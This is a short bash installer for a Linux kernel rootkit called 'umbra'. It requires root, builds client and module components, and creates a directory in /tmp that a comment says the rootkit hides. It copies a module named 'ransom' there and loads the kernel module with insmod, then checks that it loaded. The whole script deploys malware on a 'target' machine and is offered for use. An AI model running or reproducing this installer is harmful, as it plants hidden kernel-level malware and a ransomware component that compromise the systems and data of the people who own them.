#!/bin/bash
if (( $EUID != 0 )); then
    echo "Please use sudo or run as root"
    exit
fi

# You need to have compiled umbra.ko by now, either on the target or a machine with the same header files
# Installing module
cd client
make
cd ../modules
make
cd ..
mkdir /tmp/umbra #secret dir for umbra, hidden by the rootkit
cp modules/ransom /tmp/umbra

cd kernel
insmod ./umbra.ko

if [[ $(lsmod | grep umbra) = *umbra* ]]; then
    echo "Install success"
else
    echo "Install fail"
fi